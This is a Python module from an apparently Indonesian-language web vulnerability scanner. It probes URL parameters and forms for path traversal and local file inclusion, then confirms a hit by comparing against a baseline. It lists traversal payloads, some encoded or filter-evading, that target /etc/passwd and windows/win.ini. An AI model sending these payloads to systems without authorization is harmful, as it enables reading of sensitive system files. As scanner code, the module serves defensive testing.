"""Local File Inclusion / Path Traversal — verification-first.

Masalah lama: regex `root:x:0:0:` di satu respons → halaman dokumentasi yang memuat
string itu dianggap rentan. Pendekatan baru: konten file sistem harus TIDAK ada di
baseline TAPI MUNCUL setelah payload, dan untuk /etc/passwd butuh ≥2 baris berformat
`user:x:uid:gid:` (struktur yang tak mungkin kebetulan ada sebagai teks biasa).
"""
from __future__ import annotations

import re

from cyberloka.active._helpers import (
    candidate_urls,
    fetch,
    fuzz_forms,
    param_names,
    replace_param,
)
from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.core.util import truncate

PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "....\\....\\....\\....\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
]

PASSWD_LINE_RE = re.compile(r"^[a-z_][a-z0-9_-]*:[x*!]?:\d+:\d+:", re.I | re.M)
WIN_INI_RE = re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.I)


def _passwd(body: str) -> bool:
    return len(PASSWD_LINE_RE.findall(body)) >= 2


def _winini(body: str) -> bool:
    return bool(WIN_INI_RE.search(body))


def _lfi_finding(param: str, target_url: str, which: str, body: str, is_form: bool) -> Finding:
    where = f"field form `{param}`" if is_form else f"`{param}`"
    return Finding(
        module="lfi",
        title=f"LFI / Path Traversal TERVERIFIKASI pada {where}",
        severity=Severity.CRITICAL,
        confidence="confirmed",
        description=(
            f"Isi file sistem ({which}) berhasil dibaca lewat aplikasi dan konten ini TIDAK ada "
            "pada respons baseline — membuktikan payload traversal benar-benar membongkar file."
        ),
        target=target_url,
        evidence=truncate(body, 240),
        cwe="CWE-22",
        remediation=(
            "Jangan menerima path file dari user. Gunakan whitelist nama file/identifier dan map ke "
            "path internal. Canonicalisasi path lalu cek tetap di dalam direktori yang diizinkan."
        ),
        references=["https://owasp.org/www-community/attacks/Path_Traversal"],
    )


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        for scan_url in candidate_urls(target, config, "file", "index"):
            base = fetch(client, scan_url)
            base_body = base.text if base else ""
            base_passwd, base_winini = _passwd(base_body), _winini(base_body)
            for param in param_names(scan_url):
                for payload in PAYLOADS:
                    resp = fetch(client, replace_param(scan_url, param, payload))
                    if resp is None:
                        continue
                    hit_passwd = _passwd(resp.text) and not base_passwd
                    hit_winini = _winini(resp.text) and not base_winini
                    if hit_passwd or hit_winini:
                        which = "/etc/passwd" if hit_passwd else "windows/win.ini"
                        findings.append(_lfi_finding(param, replace_param(scan_url, param, payload), which, resp.text, False))
                        return findings

        for payload in PAYLOADS:
            for field, action, resp in fuzz_forms(client, config, payload):
                body = resp.text or ""
                if _passwd(body) or _winini(body):
                    which = "/etc/passwd" if _passwd(body) else "windows/win.ini"
                    findings.append(_lfi_finding(field, action, which, body, True))
                    return findings
    finally:
        client.close()
    return findings
